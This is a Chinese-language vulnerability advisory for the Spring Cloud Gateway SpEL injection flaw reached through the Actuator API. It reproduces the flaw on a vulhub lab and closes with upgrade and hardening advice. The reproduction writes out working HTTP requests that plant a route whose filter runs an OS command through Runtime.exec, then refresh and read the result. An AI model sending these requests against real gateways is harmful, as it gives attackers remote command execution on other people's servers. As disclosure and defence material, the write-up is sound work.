01

风险说明




   Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。



02

影响版本





  • 3.1.0


  • 3.0.0 到 3.0.6


  • 旧的、不受支持的版本也会受到影响




03

漏洞复现




环境启动使用vulhub进行一键docker启动：

访问首页如下：

第一步，发送一个添加包含恶意SpEL表达式的路由的POST数据包：

POST /actuator/gateway/routes/<route_id> HTTP/1.1Host: IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Content-Type: application/jsonConnection: closeContent-Length: 327
{  "id": "<route_id>",  "filters": [{    "name": "AddResponseHeader",    "args": {      "name": "Result",      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"    }  }],  "uri": "http://example.com"}

可以看到该id为test的路由已经创建好了，第二步就是发送POST数据包去刷新下，这样创建的路由就被应用了：

POST /actuator/gateway/refresh HTTP/1.1Host: IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Content-Type: application/jsonConnection: closeContent-Length: 2

这里就会去触发恶意SpEL表达式，最后就是GET请求创建的路由去查看执行结果：

GET /actuator/gateway/routes/<route_id> HTTP/1.1Host: IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Content-Type: application/x-www-form-urlencodedConnection: closeContent-Length: 2

最后清理下数据：

DELETE /actuator/gateway/routes/<route_id> HTTP/1.1Host: IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Content-Type: application/jsonConnection: closeContent-Length: 2

再用第二步的POST请求去刷新下，这样路由就被清理了。



04

修复建议




受影响版本的用户应应用以下补救措施:

- 3.1.x 用户应升级到 3.1.1+;

- 3.0.x 用户应该升级到 3.0.7+;

- 如果不需要网关执行器端点，则应通过 management.endpoint.gateway.enabled: false 禁用它;

- 如果需要执行器，则应使用 Spring Security 对其进行保护，请参阅[https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints.security]。

已修复此问题的版本包括：

- 3.1.1+

- 3.0.7+禁
